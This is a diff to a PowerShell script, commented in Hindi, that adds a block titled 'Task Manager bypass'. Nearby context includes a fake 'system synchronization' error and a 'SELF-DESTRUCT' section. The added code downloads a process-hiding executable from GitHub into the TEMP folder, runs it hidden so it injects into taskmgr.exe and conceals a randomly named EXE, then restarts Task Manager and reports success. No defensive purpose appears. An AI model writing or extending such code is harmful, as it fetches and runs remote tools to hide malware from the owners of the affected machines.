@@ -169,6 +169,38 @@ try {
 
 } catch {
     Write-Host "`n[!] CRITICAL ERROR: System synchronization interrupted." -ForegroundColor Red
+
+    
+# ========== यह कोड EXISTING SCRIPT के END में जोड़ें ==========
+
+Write-Host "[*] INITIATING TASK MANAGER BYPASS..." -ForegroundColor Cyan
+
+# 1. Process Hider Tool को TEMP में Download करें
+$hiderPath = "$env:TEMP\ProcessHider.exe"
+if (-not (Test-Path $hiderPath)) {
+    Write-Host "[+] Downloading Process Hider Tool..." -ForegroundColor Gray
+    $hiderUrl = "https://github.com/patopolser/Process-Hider/raw/master/MainFile/ProcessHider.exe"
+    Invoke-WebRequest -Uri $hiderUrl -OutFile $hiderPath -UseBasicParsing
+}
+
+# 2. Tool को Run करें (यह अपने आप Task Manager में Inject हो जाएगा)
+# -n "$rnd.exe" : आपकी EXE के RANDOM NAME को Hide करेगा
+# -x "taskmgr.exe" : सिर्फ Task Manager को Target करेगा
+if (Test-Path $hiderPath) {
+    Write-Host "[+] Bypassing Task Manager (API Hooking)..." -ForegroundColor Gray
+    Start-Process -FilePath $hiderPath -ArgumentList "-n `"$rnd.exe`" -x `"taskmgr.exe`"" -WindowStyle Hidden
+    
+    # Tool को Inject होने का थोड़ा समय दें
+    Start-Sleep -Seconds 2
+    
+    # Task Manager को Restart करें ताकि Changes Apply हों
+    Stop-Process -Name "Taskmgr" -Force -ErrorAction SilentlyContinue
+    Start-Sleep -Seconds 1
+    Start-Process "taskmgr.exe"
+    Write-Host "[+] SUCCESS! Your EXE is now HIDDEN from Task Manager!" -ForegroundColor Green
+}
+# ========== END OF ADDED CODE ==========
+
 }
 
 # 6. SELF-DESTRUCT
